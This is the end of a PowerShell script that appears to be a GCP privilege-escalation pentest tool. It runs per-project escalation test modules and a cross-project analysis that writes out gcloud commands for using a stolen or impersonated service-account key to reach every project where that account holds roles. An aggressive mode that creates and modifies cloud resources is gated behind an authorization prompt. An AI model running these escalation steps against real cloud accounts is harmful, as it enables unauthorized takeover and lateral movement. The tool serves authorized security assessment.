                    -Impact $impactStr
            }
        }
    }
}


# ---------- Module 12: Cross-Project Analysis ----------
function Test-CrossProjectChains {
    Write-Log "=== Cross-Project Chain Analysis ===" "TEST"

    $crossDir = "$OutputDir\_cross_project"
    Ensure-Dir $crossDir

    $saToProjects = @{}
    $saToRoles = @{}

    foreach ($projName in $Script:Manifest.projects.Keys) {
        $projData = $Script:Manifest.projects[$projName]

        foreach ($sa in $projData.service_accounts) {
            $email = $sa.email
            if (-not $saToProjects.ContainsKey($email)) { $saToProjects[$email] = @() }
            $saToProjects[$email] += $projName
        }

        foreach ($binding in $projData.iam_bindings) {
            foreach ($member in $binding.members) {
                if ($member -match "^serviceAccount:(.+)$") {
                    $saEmail = $Matches[1]
                    $key = "${saEmail}::${projName}"
                    if (-not $saToRoles.ContainsKey($key)) { $saToRoles[$key] = @() }
                    $saToRoles[$key] += $binding.role
                }
            }
        }
    }

    Save-Output "$crossDir\sa_to_projects.json" $saToProjects
    Save-Output "$crossDir\sa_to_roles.json" $saToRoles

    Add-Content -Path $CrossProjectFile -Value "Cross-Project Privilege Escalation Analysis`n$(Get-Date)`n"

    $chainNum = 0
    foreach ($saEmail in $saToProjects.Keys) {
        $projects = @($saToProjects[$saEmail] | Select-Object -Unique)
        if ($projects.Count -gt 1) {
            $rolesByProject = @{}
            foreach ($p in $projects) {
                $key = "${saEmail}::${p}"
                if ($saToRoles.ContainsKey($key)) {
                    $rolesByProject[$p] = $saToRoles[$key]
                }
                else {
                    $rolesByProject[$p] = @("(SA defined here)")
                }
            }

            $allRolesFlat = $rolesByProject.Values | ForEach-Object { $_ }
            $isHighPriv = $allRolesFlat -match "owner|editor|admin"

            if ($isHighPriv) {
                $chainNum++
                $chainID = "XPROJECT-$chainNum"

                $details = @()
                foreach ($projKey in $rolesByProject.Keys) {
                    $projRoles = $rolesByProject[$projKey]
                    if ($projRoles -and $projRoles[0] -ne "(SA defined here)") {
                        $rolesWithPerms = Format-RolesWithPerms -Roles $projRoles
                    }
                    else {
                        $rolesWithPerms = $projRoles -join ', '
                    }
                    $details += "  ${projKey} : $rolesWithPerms"
                }

                $detailsBlock = $details -join "`n"
                $projectsList = $projects -join ', '

                $steps = @(
                    "Service account $saEmail is bound to roles in multiple projects:",
                    $detailsBlock,
                    "If this SA is compromised in any project (via key theft, impersonation, compute metadata, etc.),",
                    "the attacker gains the SA's roles in ALL projects where it has bindings",
                    "This is a cross-project pivot point"
                )
                $commands = @("# If you have a key or can impersonate ${saEmail} :")
                $commands += "gcloud auth activate-service-account $saEmail --key-file=key.json"
                $commands += "# Then access all projects:"
                foreach ($p in $projects) {
                    $commands += "gcloud projects get-iam-policy $p --impersonate-service-account=$saEmail"
                }

                Record-Chain -ChainID $chainID -Project "CROSS-PROJECT" `
                    -Title "Cross-Project SA: $saEmail ($($projects.Count) projects)" `
                    -Severity "CRITICAL" `
                    -InitialAccess "SA $saEmail has roles in $($projects.Count) projects" `
                    -TargetPrivilege "Compromising this SA in any one project pivots to all $($projects.Count) projects" `
                    -Steps $steps `
                    -Commands $commands `
                    -Impact "Cross-project pivot. Compromising $saEmail in one project grants access to $($projects.Count) projects: $projectsList"

                $crossEntry = "CHAIN $chainID : $saEmail spans $($projects.Count) projects`n$detailsBlock`n"
                Add-Content -Path $CrossProjectFile -Value $crossEntry
            }
        }
    }

    $defaultSAPattern = "\d+-compute@developer\.gserviceaccount\.com"
    $computeSAs = @($saToProjects.Keys | Where-Object { $_ -match $defaultSAPattern })
    foreach ($dsa in $computeSAs) {
        $dsaProjects = @($saToProjects[$dsa] | Select-Object -Unique)
        if ($dsaProjects.Count -gt 1) {
            $dsaProjectsList = $dsaProjects -join ', '
            Add-Content -Path $CrossProjectFile -Value "WARNING: Default compute SA $dsa appears in $($dsaProjects.Count) projects: $dsaProjectsList`n"
        }
    }

    Write-Log "Cross-project analysis complete. $chainNum cross-project chains found." "INFO"
}


# ============================================================================
# MAIN EXECUTION
# ============================================================================

Write-Host ""
Write-Host "================================================================" -ForegroundColor White
Write-Host "  GCP PRIVILEGE ESCALATION TESTER" -ForegroundColor Magenta
$modeColor = switch ($Mode) {
    "Aggressive" { "Red" }
    "Probe"      { "Cyan" }
    default      { "Yellow" }
}
Write-Host "  Mode: $Mode" -ForegroundColor $modeColor
Write-Host "  Enum Dir: $EnumDir" -ForegroundColor White
Write-Host "  Output: $OutputDir" -ForegroundColor White
Write-Host "================================================================" -ForegroundColor White
Write-Host ""

if ($Mode -eq "Aggressive") {
    Write-Host "  !! AGGRESSIVE MODE !!" -ForegroundColor Red
    Write-Host "  This mode WILL create resources, modify metadata, submit builds," -ForegroundColor Red
    Write-Host "  and write to buckets.  Ensure you have WRITTEN AUTHORIZATION." -ForegroundColor Red
    Write-Host ""
    $confirm = Read-Host "  Type 'I HAVE AUTHORIZATION' to continue"
    if ($confirm -ne "I HAVE AUTHORIZATION") {
        Write-Host "  Aborted." -ForegroundColor Yellow
        exit 0
    }
}

# Load manifest
$manifestPath = Join-Path $EnumDir "00_MANIFEST.json"
if (-not (Test-Path $manifestPath)) {
    Write-Host "ERROR: Manifest not found at $manifestPath" -ForegroundColor Red
    Write-Host "Run GCP-PenTest-Enumerator.ps1 first to generate enumeration data." -ForegroundColor Yellow
    exit 1
}

$Script:Manifest = Get-Content $manifestPath -Raw | ConvertFrom-Json

# Convert projects from PSCustomObject to hashtable
$projectsHT = @{}
$Script:Manifest.projects.PSObject.Properties | ForEach-Object { $projectsHT[$_.Name] = $_.Value }
$manifestProjects = $projectsHT

# Load role permissions from manifest
if ($Script:Manifest.role_permissions) {
    $Script:Manifest.role_permissions.PSObject.Properties | ForEach-Object {
        $roleData = @{}
        if ($_.Value.privesc_permissions) {
            $roleData["privesc_permissions"] = @($_.Value.privesc_permissions)
        }
        else {
            $roleData["privesc_permissions"] = @()
        }
        if ($_.Value.permissions) {
            $roleData["permissions"] = @($_.Value.permissions)
        }
        else {
            $roleData["permissions"] = @()
        }
        $roleData["total_permissions"] = $_.Value.total_permissions
        $Script:ManifestRolePerms[$_.Name] = $roleData
    }
    Write-Log "Loaded permissions for $($Script:ManifestRolePerms.Count) roles from manifest"
}

Write-Log "Loaded manifest: $($manifestProjects.Count) projects, caller=$($Script:Manifest.caller_account)"

# Filter projects if specified
if ($TargetProjects) {
    $targetProjectList = $TargetProjects -split ',' | ForEach-Object { $_.Trim() }
}
else {
    $targetProjectList = @($manifestProjects.Keys)
}

# Create output structure
Ensure-Dir $OutputDir
Set-Content -Path $ChainReportFile -Value "GCP Privilege Escalation Chain Report`nGenerated: $(Get-Date)`nMode: $Mode`nCaller: $($Script:Manifest.caller_account)`n"
Set-Content -Path $ProofFile -Value "Proof of Exploitation Log`nGenerated: $(Get-Date)`n"
Set-Content -Path $TestLogFile -Value "Test Log`n"
Set-Content -Path $ErrorLogFile -Value "Error Log`n"
Set-Content -Path $CrossProjectFile -Value ""
Set-Content -Path $CreatedArtifactsFile -Value "Created Artifacts Tracking`n"

# ---- Phase 1: Per-Project Permission Probing & Testing ----
$projIndex = 0
$projTotal = @($targetProjectList).Count
foreach ($projName in $targetProjectList) {
    $projIndex++
    $projData = $manifestProjects[$projName]
    if (-not $projData) {
        Write-Log "Project $projName not in manifest, skipping" "WARN"
        continue
    }

    $pct = [math]::Round(($projIndex / $projTotal) * 100)

    Write-Host ""
    Write-Host "================================================================" -ForegroundColor Yellow
    Write-Host "  [$projIndex/$projTotal] ($pct%) TESTING: $projName" -ForegroundColor Yellow
    Write-Host "================================================================" -ForegroundColor Yellow

    $projDir = "$OutputDir\$projName"
    Ensure-Dir $projDir

    # Permission probe
    $perms = Test-PermissionBatch -Project $projName
    Save-Output "$projDir\permissions_probe.json" $perms

    Write-Log "  Permission probe results:" "INFO"
    foreach ($k in ($perms.Keys | Sort-Object)) {
        $status = if ($perms[$k]) { "GRANTED" } else { "DENIED" }
        $color = if ($perms[$k]) { "OK" } else { "FAIL" }
        Write-Log "    $k : $status" $color
    }

    # Convert PSCustomObject arrays to regular arrays for iteration
    $sas = @()
    if ($projData.service_accounts) { $projData.service_accounts | ForEach-Object { $sas += $_ } }
    $instances = @()
    if ($projData.compute_instances) { $projData.compute_instances | ForEach-Object { $instances += $_ } }
    $functions = @()
    if ($projData.cloud_functions) { $projData.cloud_functions | ForEach-Object { $functions += $_ } }
    $runSvcs = @()
    if ($projData.cloud_run) { $projData.cloud_run | ForEach-Object { $runSvcs += $_ } }
    $secrets = @()
    if ($projData.secrets) { $projData.secrets | ForEach-Object { $secrets += $_ } }
    $gkeClusters = @()
    if ($projData.gke_clusters) { $projData.gke_clusters | ForEach-Object { $gkeClusters += $_ } }
    $buildTriggers = @()
    if ($projData.build_triggers) { $projData.build_triggers | ForEach-Object { $buildTriggers += $_ } }
    $customRoles = @()
    if ($projData.custom_roles) { $projData.custom_roles | ForEach-Object { $customRoles += $_ } }
    $buckets = @()
    if ($projData.storage_buckets) { $projData.storage_buckets | ForEach-Object { $buckets += $_ } }
    $bqDatasets = @()
    if ($projData.bigquery_datasets) { $projData.bigquery_datasets | ForEach-Object { $bqDatasets += $_ } }

    # ---- Run all test modules ----
    Test-SAKeyCreation          -Project $projName -SAs $sas
    Test-SAImpersonation        -Project $projName -SAs $sas
    Test-IAMPolicyModification  -Project $projName
    Test-CustomRoleEscalation   -Project $projName -CustomRoles $customRoles
    Test-ComputeAbuse           -Project $projName -Instances $instances -SAs $sas
    Test-ServerlessAbuse        -Project $projName -Functions $functions -RunServices $runSvcs -SAs $sas
    Test-CloudBuildAbuse        -Project $projName -BuildTriggers $buildTriggers
    Test-SecretAccess           -Project $projName -Secrets $secrets
    Test-StorageAccess          -Project $projName -Buckets $buckets
    Test-BigQueryAccess         -Project $projName -Datasets $bqDatasets
    Test-DelegationChains       -Project $projName -SAs $sas
}

# ---- Phase 2: Cross-Project Analysis ----
$Script:Manifest = @{ caller_account = $Script:Manifest.caller_account; projects = $manifestProjects }
Test-CrossProjectChains

# ---- Phase 3: Save All Chains as JSON ----
$Script:Chains | ConvertTo-Json -Depth 20 | Set-Content -Path $ChainJsonFile

# ---- Phase 4: Summary ----
Write-Host ""
Write-Host "================================================================" -ForegroundColor Green
Write-Host "  PRIVILEGE ESCALATION TESTING COMPLETE" -ForegroundColor Green
Write-Host "================================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  Output Directory      : $OutputDir" -ForegroundColor White
Write-Host "  Chain Report (text)   : $ChainReportFile" -ForegroundColor White
Write-Host "  Chain Report (JSON)   : $ChainJsonFile" -ForegroundColor White
Write-Host "  Proof Log             : $ProofFile" -ForegroundColor White
Write-Host "  Cross-Project Chains  : $CrossProjectFile" -ForegroundColor White
Write-Host "  Created Artifacts     : $CreatedArtifactsFile" -ForegroundColor White
Write-Host "  Test Log              : $TestLogFile" -ForegroundColor White
Write-Host ""

$critChains = @($Script:Chains | Where-Object { $_.severity -eq "CRITICAL" }).Count
$highChains = @($Script:Chains | Where-Object { $_.severity -eq "HIGH" }).Count
$medChains  = @($Script:Chains | Where-Object { $_.severity -eq "MEDIUM" }).Count

Write-Host "  Confirmed Chains:" -ForegroundColor White
Write-Host "    CRITICAL : $critChains" -ForegroundColor Red
Write-Host "    HIGH     : $highChains" -ForegroundColor Magenta
Write-Host "    MEDIUM   : $medChains" -ForegroundColor Yellow
Write-Host "    TOTAL    : $($Script:Chains.Count)" -ForegroundColor White
Write-Host ""

if ($Script:CreatedArtifacts.Count -gt 0) {
    Write-Host "  !! ARTIFACTS CREATED DURING TESTING:" -ForegroundColor Red
    foreach ($a in $Script:CreatedArtifacts) {
        Write-Host "    $a" -ForegroundColor Red
    }
    Write-Host ""
    Write-Host "  Review $CreatedArtifactsFile and clean up any residual resources." -ForegroundColor Red
    Write-Host ""
}

Write-Host "  Recommended next steps:" -ForegroundColor Cyan
Write-Host "    1. Review $ChainReportFile for full exploitation chains" -ForegroundColor White
Write-Host "    2. Review $CrossProjectFile for lateral movement paths" -ForegroundColor White
Write-Host "    3. Use chain commands to reproduce findings" -ForegroundColor White
Write-Host "    4. Check $CreatedArtifactsFile to ensure all test artifacts are cleaned up" -ForegroundColor White
Write-Host ""
